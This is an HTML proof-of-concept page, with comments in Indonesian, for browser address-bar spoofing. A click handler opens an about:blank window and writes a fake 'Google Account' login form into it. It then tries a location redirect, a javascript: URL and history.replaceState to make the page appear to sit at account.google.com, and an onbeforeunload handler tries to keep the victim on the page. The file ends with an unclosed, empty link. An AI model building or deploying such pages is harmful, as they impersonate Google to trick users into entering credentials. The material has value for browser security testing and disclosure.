<html>
<head>
<script>
function f() {
    w = window.open("about:blank", "_blank");
    
    // Tulis fake content dulu
    w.document.write(`
        <html>
        <head><title>Google Account</title></head>
        <body>
            <div style="font-family: Arial, sans-serif; padding: 20px;">
                <h1>Fake Google Login</h1>
                <p>Address bar shows account.google.com but content is fake!</p>
                <input type="email" placeholder="Email or phone">
                <button>Next</button>
            </div>
            <script>
                // Coba redirect tapi FAIL/BLOCKED
                try {
                    // Method 1: Redirect ke URL yang invalid
                    window.location = "https://account.google.com#blocked-by-poc";
                    
                    // Method 2: Redirect yang diblock oleh CSP
                    window.location.replace("javascript:alert('redirect blocked')");
                    
                    // Method 3: Manipulasi history untuk spoof URL
                    history.replaceState(null, "Google Account", "https://account.google.com");
                    
                } catch(e) {
                    // Redirect gagal, tetap di halaman fake
                    console.log("Redirect failed as expected");
                }
                
                // Block further redirect attempts
                window.onbeforeunload = function() { 
                    return "Redirect blocked by POC"; 
                };
            <\/script>
        </body>
        </html>
    `);
    w.document.close();
}
</script>
</head>
<body>

    <a href="#" onclick="f()" style="padding: 10px 20px; background: #4285f4; color: white; text-decoration: none; border-radius: 4px;">

</html>
